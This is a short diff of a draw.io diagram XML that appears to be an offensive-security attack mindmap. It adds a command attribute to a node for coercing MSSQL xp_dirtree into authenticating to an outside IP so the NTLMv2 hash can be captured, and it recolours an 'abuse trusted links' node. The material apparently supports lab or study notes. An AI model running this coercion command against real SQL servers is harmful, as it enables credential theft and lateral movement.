@@ -870,7 +870,7 @@
             <mxPoint x="380" y="1480" as="targetPoint" />
           </mxGeometry>
         </mxCell>
-        <object label="coerce xp_dirtree to get NTLMV2 hash" id="YItOHf5SX_0kVXQKCcuo-3">
+        <object label="coerce xp_dirtree to get NTLMV2 hash" cmd="xp_dirtree \\192.168.45.212\test" id="YItOHf5SX_0kVXQKCcuo-3">
           <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1">
             <mxGeometry height="70" width="150" x="87.5" y="1290" as="geometry" />
           </mxCell>
@@ -943,7 +943,7 @@
             <mxGeometry height="70" width="126" x="200" y="425" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="PTz_sH_h7iwSk9bTQDM_-1" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="abuse trusted links" vertex="1">
+        <mxCell id="PTz_sH_h7iwSk9bTQDM_-1" parent="1" style="rounded=1;whiteSpace=wrap;html=1;strokeColor=light-dark(#000000,#E5A50A);" value="abuse trusted links" vertex="1">
           <mxGeometry height="60" width="120" x="87.5" y="1450" as="geometry" />
         </mxCell>
         <mxCell id="Zl1azVjz_Hir06-zNHVM-4" edge="1" parent="1" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=11;fontColor=default;labelBackgroundColor=default;endArrow=block;endFill=1;" value="">
